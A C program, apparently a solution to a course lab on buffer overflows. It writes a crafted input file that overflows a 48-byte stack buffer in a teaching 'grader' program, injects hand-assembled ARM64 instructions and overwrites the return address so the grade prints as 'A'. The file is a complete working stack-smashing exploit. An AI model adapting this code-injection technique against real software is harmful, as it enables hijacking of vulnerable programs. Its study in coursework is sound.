/* 
produces a file named dataA that, when fed to the grader program, makes it print 'A' as the grade.
it writes a short name followed by a '\0', then padding to overflow the stack buffer.
after that, it inserts machine instructions (using miniassembler) that move 'A' into a register,
store it into the grade variable, and then branch back so the program prints the altered grade.
finally, it overwrites the return address with the location of these instructions.
*/

/*
this main function:
- takes no command line arguments
- does not read from stdin
- does not write to stdout or stderr except on error
- writes a crafted sequence of bytes to 'dataA' to cause the grader to print 'A'
- returns 0 on success, non-zero otherwise
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

int main(void) {
    /* local comments: 
       we'll write "An", then '\0', then pad to fill the 48-byte buffer.
       we place our instructions right after the buffer, each is 4 bytes:
       mov w0, #('A')
       adr x1, gradeAddr
       strb w0, [x1]
       b backToPrint
       then overwrite return address with the start of our code.
       ensure no newlines (0x0a).
    */

    const char *name = "An"; /* short name to avoid complexity */
    const unsigned int charA = 65; /* 'A' */
    unsigned long gradeAddr = 0x420044;     /* grade variable address */
    unsigned long returnToPrint = 0x40089c; /* address where program prints grade */
    unsigned long codeStart = 0x42007c;     /* chosen code injection address */

    /* build instructions */
    unsigned int movInstr = MiniAssembler_mov(0, charA); /* mov w0, #A */
    unsigned int adrInstr = MiniAssembler_adr(1, gradeAddr, codeStart + 4); /* adr x1,gradeAddr */
    unsigned int strbInstr = MiniAssembler_strb(0, 1); /* strb w0,[x1] */
    unsigned int bInstr = MiniAssembler_b(returnToPrint, codeStart + 12); /* b backToPrint */

    FILE *fp = fopen("dataA", "w");
    if (!fp) return 1;

    /* write name + '\0' */
    fwrite(name, 1, 2, fp);
    fputc('\0', fp);

    /* we've written 3 bytes so far (2 chars + null)
       we need total 48 for buffer:
       48 - 3 = 45 more null bytes */
    for (int i = 0; i < 45; i++) {
        fputc('\0', fp);
    }

    /* now write instructions (4 instructions * 4 bytes each = 16 bytes) */
    fwrite(&movInstr, sizeof(movInstr), 1, fp);
    fwrite(&adrInstr, sizeof(adrInstr), 1, fp);
    fwrite(&strbInstr, sizeof(strbInstr), 1, fp);
    fwrite(&bInstr, sizeof(bInstr), 1, fp);

    /* overwrite return address with codeStart */
    unsigned long fakeReturn = codeStart;
    fwrite(&fakeReturn, sizeof(fakeReturn), 1, fp);

    fclose(fp);
    return 0;
}